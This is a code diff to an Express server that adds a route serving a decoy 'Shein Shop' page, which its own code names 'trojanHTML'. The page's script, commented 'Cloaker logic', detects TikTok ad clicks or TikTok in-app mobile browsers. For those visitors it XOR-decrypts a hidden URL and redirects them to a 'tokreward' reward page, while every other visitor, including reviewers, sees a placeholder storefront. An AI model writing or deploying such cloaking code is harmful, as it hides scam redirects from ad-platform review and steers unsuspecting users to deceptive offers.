@@ -864,6 +864,143 @@ app.get('/api/dudd/v1/entry', async (req, res) => {
     }
 });
 
+
+// END TRAPI
+
+// ALEXIARES V3
+
+// SHEIN V3
+
+const xorEncrypt = (str, key) => {
+    let result = '';
+    for (let i = 0; i < str.length; i++) {
+        result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+    }
+    return result;
+};
+
+app.get('/sheinv3/:slug', (req, res, next) => {
+    const { offer, slug } = req.params;
+    const seven = `https://tokreward.com/shein.html?slug=${slug}`;
+    const key = 'delet-';
+    const eight = xorEncrypt(seven, key);
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const ttclid = urlParams.get("ttclid");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                const isTok = /musical_ly|Bytedance|BytedanceWebview|ByteLocale/i.test(navigator.userAgent);
+                if (ttclid || (isMobileDevice && isTok)) {
+                    const xorDecrypt = (str, key) => {
+                        let result = '';
+                        for (let i = 0; i < str.length; i++) {
+                            result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+                        }
+                        return result;
+                    };
+                    const nine = "${key}";
+                    const eight = "${eight}";
+                    const seven = xorDecrypt(eight, nine);
+                    window.location.href = seven;
+                } else {
+                }
+            </script>
+            <style>
+                body {
+                    font-family: Arial, sans-serif;
+                    margin: 0;
+                    padding: 0;
+                    background-color: #f4f4f4;
+                }
+                header {
+                    background-color: #333;
+                    color: #fff;
+                    padding: 1rem 0;
+                    text-align: center;
+                }
+                main {
+                    padding: 2rem;
+                }
+                .banner {
+                    background-color: #e0e0e0;
+                    padding: 2rem;
+                    text-align: center;
+                }
+                .products {
+                    display: flex;
+                    flex-wrap: wrap;
+                    gap: 1rem;
+                    justify-content: center;
+                }
+                .product {
+                    background-color: #fff;
+                    border: 1px solid #ddd;
+                    border-radius: 8px;
+                    padding: 1rem;
+                    width: 200px;
+                    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+                }
+                .product img {
+                    max-width: 100%;
+                    border-bottom: 1px solid #ddd;
+                    margin-bottom: 1rem;
+                }
+                footer {
+                    background-color: #333;
+                    color: #fff;
+                    padding: 1rem 0;
+                    text-align: center;
+                    margin-top: 2rem;
+                }
+            </style>
+       <body>
+            <header>
+                <h1>Welcome to ${slug} Shop!</h1>
+            </header>
+            <main>
+                <div class="banner">
+                    <h2>Exclusive Offers on Trendy Fashion</h2>
+                    <p>Shop the latest trends and get the best deals at ${slug} Shop.</p>
+                </div>
+                <div class="products">
+                    <div class="product">
+                        <img src="https://via.placeholder.com/200" alt="Product 1">
+                        <h3>Trendy Top</h3>
+                        <p>$19.99</p>
+                    </div>
+                    <div class="product">
+                        <img src="https://via.placeholder.com/200" alt="Product 2">
+                        <h3>Stylish Jeans</h3>
+                        <p>$39.99</p>
+                    </div>
+                    <div class="product">
+                        <img src="https://via.placeholder.com/200" alt="Product 3">
+                        <h3>Fashionable Jacket</h3>
+                        <p>$59.99</p>
+                    </div>
+                    <div class="product">
+                        <img src="https://via.placeholder.com/200" alt="Product 4">
+                        <h3>Elegant Dress</h3>
+                        <p>$49.99</p>
+                    </div>
+                </div>
+            </main>
+            <footer>
+                <p>&copy; ${new Date().getFullYear()} ${slug} Shop. All rights reserved.</p>
+            </footer>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+});
+
+
 // Middleware to pass on Jay's SubIDs SHEIN D2O
 app.get('/jsheindir/:slug', (req, res, next) => {
     const { offer, slug } = req.params;
